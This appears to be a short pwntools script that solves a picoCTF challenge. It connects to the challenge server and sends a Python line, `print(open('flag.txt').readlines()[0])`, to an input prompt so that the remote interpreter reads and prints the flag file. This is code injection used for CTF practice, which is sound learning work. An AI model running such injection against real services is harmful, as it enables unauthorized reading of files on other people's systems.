from pwn import *

#####################################################change directory#################################3
ip = "saturn.picoctf.net:59497"
#######################################start process#############################################
r = remote(ip.split(':')[0], ip.split(':')[1])

code = "print(open('flag.txt').readlines()[0])"
print("code: ", code)
r.sendlineafter("==>", code)
r.interactive()